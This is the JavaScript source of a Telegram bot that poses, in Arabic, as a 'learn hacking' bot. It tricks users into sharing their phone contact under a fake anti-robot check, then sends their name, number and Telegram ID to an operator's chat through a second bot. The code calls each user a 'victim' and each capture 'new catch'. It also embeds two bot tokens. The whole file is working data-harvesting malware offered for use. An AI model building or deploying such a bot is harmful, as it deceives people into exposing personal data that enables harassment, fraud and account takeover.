const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const NEW_BOT_TOKEN = '8889361043:AAFJvk7YLDKun_7S9Y91FrRq1fXKFy8DyD0';
const MAIN_BOT_TOKEN = '8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90';
const HACKER_IMAGE = 'https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png';

const bot = new TelegramBot(NEW_BOT_TOKEN, { polling: true });

const targetUsers = {};

bot.onText(/\/start(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const param = match[1];

    if (param) {
        targetUsers[chatId] = param;
    }

    const text = `☠️ أهلاً بك في بوت تعلم الهكر ☠️\n\n⚠️ تنبيه أمني: لا يمكنك استخدام هذا البوت إلا بعد التحقق من هويتك.\n\nيرجى مشاركة رقمك للتحقق من أنك لست روبوت:`;
    
    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [[{ text: '📱 مشاركة رقمي للتحقق', request_contact: true }]],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
    
    bot.sendPhoto(chatId, HACKER_IMAGE, { caption: text, ...options }).catch(() => {
        bot.sendMessage(chatId, text, options);
    });
});

bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    const contact = msg.contact;
    const phone = contact.phone_number;
    const name = contact.first_name || 'غير معروف';
    const victimId = msg.from.id;
    const target = targetUsers[chatId];

    if (!target) {
        bot.sendMessage(chatId, '⚠️ لم يتم التعرف على الرابط. يرجى فتح البوت من الرابط الصحيح.');
        return;
    }

    const message = `🕷️ <b>صيد جديد من بوت تعلم الهكر</b> 🕷️\n\n👤 <b>الاسم:</b> ${name}\n📱 <b>الرقم:</b> <code>+${phone}</code>\n🆔 <b>آيدي الضحية:</b> <code>${victimId}</code>`;

    try {
        await axios.post(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
            chat_id: target,
            text: message,
            parse_mode: 'HTML'
        });
        bot.sendMessage(chatId, '✅ تم التحقق من هويتك بنجاح!', { parse_mode: 'HTML' });
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, '❌ حدث خطأ في الاتصال. حاول لاحقاً.');
    }
});

console.log('⚔ بوت تعلم الهكر شغال...');
